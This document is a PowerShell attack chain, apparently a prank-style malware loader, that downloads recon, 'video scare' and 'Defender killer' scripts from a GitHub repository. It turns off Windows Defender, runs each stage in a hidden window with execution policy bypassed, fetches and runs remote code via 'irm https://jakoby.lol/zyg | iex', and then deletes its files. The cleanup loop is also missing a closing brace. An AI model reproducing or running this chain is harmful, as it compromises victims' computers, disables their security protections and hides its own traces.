# Set Execution Policy to allow running scripts
Set-ExecutionPolicy RemoteSigned -Scope Process -Force

Write-Host "=== Starting FULL CHAIN SPOOKY FINAL SUPREME ==="

# === DOWNLOAD STAGES ===

$urls = @(
    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Original_Recon",         # Part 1 - Recon
    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/video_scare.txt",         # Part 2 - Video scare
    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Defender_Killer"          # Defender killer
)

$tempPaths = @(
    "$env:TEMP\part1.ps1",
    "$env:TEMP\part2.ps1",
    "$env:TEMP\Defender_Killer.ps1"
)

# Download all files
for ($i = 0; $i -lt $urls.Count; $i++) {
    Write-Host "Downloading Part $($i + 1)..."
    Invoke-WebRequest -Uri $urls[$i] -OutFile $tempPaths[$i] -UseBasicParsing -ErrorAction Stop
    Write-Host "Downloaded Part $($i + 1) successfully."
}

# === CHECK DEFENDER STATUS ===

Write-Host "Checking Windows Defender status..."

try {
    $defenderStatus = Get-MpPreference
    if ($defenderStatus.DisableRealtimeMonitoring -eq $false) {
        Write-Host "Defender is ACTIVE. Running custom Defender killer script..."
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[2])`"" -Wait
        Write-Host "Custom Defender killer executed."
    } else {
        Write-Host "Defender already disabled. Continuing..."
    }
} catch {
    Write-Host "Failed to check Defender status. Continuing anyway..."
}

# === EXECUTE CHAIN ===

# Run Part 1 (Recon)
Write-Host "Running Part 1 (Recon)..."
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[0])`"" -Wait
Write-Host "Part 1 completed."

# Wait for mouse movement
Write-Host "Waiting for mouse movement..."
Add-Type -AssemblyName System.Windows.Forms
$initialPosition = [System.Windows.Forms.Cursor]::Position
do {
    Start-Sleep -Milliseconds 500
    $currentPosition = [System.Windows.Forms.Cursor]::Position
} while ($initialPosition.X -eq $currentPosition.X -and $initialPosition.Y -eq $currentPosition.Y)

Write-Host "Mouse movement detected."

# Run Part 2 (Video scare)
Write-Host "Running Part 2 (Video scare)..."
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[1])`"" -Wait
Write-Host "Part 2 completed."

# Buffer short wait
Start-Sleep -Seconds 2

# Launch AcidBurn (direct memory injection)
Write-Host "Launching AcidBurn..."
try {
    irm https://jakoby.lol/zyg | iex
    Write-Host "AcidBurn launched!"
} catch {
    Write-Host "AcidBurn launch failed. Retrying..."
    Start-Sleep -Seconds 2
    irm https://jakoby.lol/zyg | iex
}

# Cleanup temp files
Write-Host "Cleaning up temp files..."
foreach ($script in $tempPaths) {
    Remove-Item -Path $script -Force -ErrorAction SilentlyContinue

Write-Host "Mission complete. Exiting."
exit
